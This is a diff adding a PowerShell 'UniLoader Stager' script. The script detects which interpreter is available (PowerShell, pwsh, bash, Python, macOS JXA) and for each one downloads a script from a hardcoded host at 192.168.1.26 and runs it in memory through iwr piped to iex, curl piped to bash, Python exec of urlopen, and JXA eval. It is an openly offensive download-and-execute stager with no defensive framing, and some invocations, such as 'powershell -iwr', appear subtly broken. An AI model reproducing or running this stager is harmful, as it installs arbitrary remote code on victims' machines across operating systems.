@@ -1,0 +1,61 @@
+# ============================
+# UniLoader Stager
+# ============================
+
+$downloadURLWindows = "http://192.168.1.26/uniloader-windows.ps1"
+$downloadURLLinux   = "http://192.168.1.26/uniloader-linux.sh"
+$downloadURLMac     = "http://192.168.1.26/uniloader-macos.sh"
+
+function Test-Interpreter {
+    param(
+        [string]$Command,
+        [string]$Args = "-Command `"exit`""
+    )
+    try {
+        & $Command $Args -ErrorAction Stop | Out-Null
+        return $true
+    } catch {
+        return $false
+    }
+}
+
+Write-Output "`n=== UniLoader Stager Starting ===`n"
+
+# --- Stage 1: PowerShell (Windows / Core) ---
+if (Test-Interpreter "powershell") {
+    Write-Output "[+] PowerShell detected"
+    powershell -iwr $downloadURLWindows | iex
+    exit
+} elseif (Test-Interpreter "pwsh") {
+    Write-Output "[+] PowerShell Core detected"
+    pwsh -iwr $downloadURLWindows | iex
+    exit
+}
+
+# --- Stage 2: Bash (Linux / macOS) ---
+if (Test-Interpreter "bash") {
+    Write-Output "[+] Bash detected"
+    bash -c "curl -fsSL $downloadURLLinux | bash"
+    exit
+}
+
+# --- Stage 3: Python ---
+if (Test-Interpreter "python3") {
+    Write-Output "[+] Python 3 detected"
+    python3 -c "import urllib.request; exec(urllib.request.urlopen('$downloadURLLinux').read())"
+    exit
+} elseif (Test-Interpreter "python") {
+    Write-Output "[+] Python 2 detected"
+    python -c "import urllib; exec(urllib.urlopen('$downloadURLLinux').read())"
+    exit
+}
+
+# --- Stage 4: macOS JXA ---
+if (Test-Interpreter "osascript") {
+    Write-Output "[+] macOS JXA detected"
+    osascript -l JavaScript -e "var x = $.NSURL.URLWithString('$downloadURLMac'); var s = $.NSString.stringWithContentsOfURLEncodingError(x,0,null); eval(s.js)"
+    exit
+}
+
+Write-Output "[-] No supported interpreter detected. Exiting."
+
